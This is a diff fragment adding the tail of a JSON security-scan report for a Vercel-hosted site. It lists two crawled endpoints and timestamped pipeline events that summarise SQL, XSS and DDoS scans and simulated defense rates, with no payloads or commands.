+  "crawled_endpoints": [
+    {
+      "path": "/",
+      "method": "GET",
+      "parameters": [],
+      "source": "probe"
+    },
+    {
+      "path": "/",
+      "method": "POST",
+      "parameters": [],
+      "source": "probe"
+    }
+  ],
+  "live_scan_status": {},
+  "pipeline_events": [
+    {
+      "timestamp": "2026-03-06T21:09:01.247978+00:00",
+      "stage": "start",
+      "message": "Starting orchestrated scan: https://carbon-iq-live.vercel.app",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:01.248179+00:00",
+      "stage": "crawl",
+      "message": "Crawling https://carbon-iq-live.vercel.app",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:01.681533+00:00",
+      "stage": "crawl",
+      "message": "Found 2 endpoints",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.667317+00:00",
+      "stage": "live_scan",
+      "message": "SQL scan complete \u2014 2 endpoints scanned",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.667343+00:00",
+      "stage": "xss_scan",
+      "message": "XSS scan complete \u2014 60 finding(s)",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.667365+00:00",
+      "stage": "ddos_scan",
+      "message": "DDoS scan complete \u2014 11 finding(s)",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.667392+00:00",
+      "stage": "defense_sim",
+      "message": "SQL defense complete \u2014 10 blocked, 96.9% defense rate",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.667415+00:00",
+      "stage": "xss_defense_sim",
+      "message": "XSS defense complete \u2014 60 mitigated, 100.0% defense rate",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.667436+00:00",
+      "stage": "ddos_defense_sim",
+      "message": "DDoS defense complete \u2014 9 mitigated, 81.8% defense rate",
+      "success": true
+    },
+    {
+      "timestamp": "2026-03-06T21:09:47.670503+00:00",
+      "stage": "static_scan",
+      "message": "Skipped (no project source for static analysis)",
+      "success": false
+    }
+  ]
+}
